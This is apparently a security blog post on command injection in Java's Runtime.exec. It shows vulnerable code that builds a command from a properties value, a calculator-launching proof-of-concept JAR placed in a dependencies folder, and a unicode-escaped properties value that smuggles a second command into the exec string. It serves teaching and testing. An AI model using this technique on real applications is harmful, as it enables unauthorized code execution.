---
layout: single
title: Command Injection in Runtime.exec via Java Properties and JAR Hijacking
date: 2023-12-11
classes: wide
tags:
  - java properties
  - command injection
  - jar hijacking
---

> In Java, Runtime.exec is often used to invoke a new process, but it does not invoke a new command shell, which means that chaining or piping multiple commands together does not usually work. Command injection is still possible if the process spawned with Runtime.exec is a command shell like command.com, cmd.exe, or /bin/sh.


The vulnerable code:

```
Runtime runtime = Runtime.getRuntime();
Properties properties = new Properties();

try (FileInputStream stream = new FileInputStream("app.properties")) {
    properties.load(stream);
}

String options = properties.getProperty("options", "");
String command = String.format("\"C:/Program Files/Java/jrexxx/bin/javaw\" -cp ".;./dependencies/*\" %s com.example.main.Example", new Object[] { options });

Process process = runtime.exec(command);
```

The configuration file.

```
options=
```

Save the following java code into a file named `Calc.java`. It is important to add the package at the beginning of the file.

```
package command.injection;

import java.io.IOException;

public class Calc {

    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

Compile the source code using the -d . option, which instructs the compiler to generate the specified directory structure.

```
javac -d . Calc.java
```

When creating a .jar file, you should use the `cvfeP` option set to guide the packaging process.

```
jar cvfeP calc.jar command.injection.Calc -C . command/injection/
```

This ensures the preservation of the package structure (P), sets the entry point for meaningful manifest information (e), names the file (f), creates an archive (c), and enables verbose output (v). The key options to focus on are P for maintaining the package structure and e for specifying the entry point. Then, append the command with the jar's name (test.jar) and its entry point. Conclude by using -C . <packagename>/ to collect class files from the designated folder while maintaining the folder's structure.

Open the `calc.jar` file in a zip program to ensure that it has the following directory structure:

```
command/
├─ injection/
│  ├─ Calc.class
META-INF/
├─ MANIFEST.MF
```

The `MANIFEST.MF` should contain the following:

```
Manifest-Version: 1.0
Created-By: <JDK Version> (Oracle Corporation)
Main-Class: command.injection.Calc
```

When manually editing your manifest file, it's important to retain the newline at the end; otherwise, Java will not recognize the manifest correctly.

Place `calc.jar` into the `/dependencies` directory of the target application.

Add the following property to the configuration file (`application.properties`) of the application:

```
options=command.injection.Calc\u0020\u0026\u003A\u003A\u0020
```

Run the target application and observe that instead of the expected program, the calculator app will launch.

Below is the value that was fed into the exec function.

```
"C:/Program Files/Java/jrexxx/bin/javaw" -cp ".;./dependencies/*\" command.injection.Calc &:: com.example.main.Example
```

## References

- [Command injection in Java](https://wiki.owasp.org/index.php/Command_injection_in_Java)
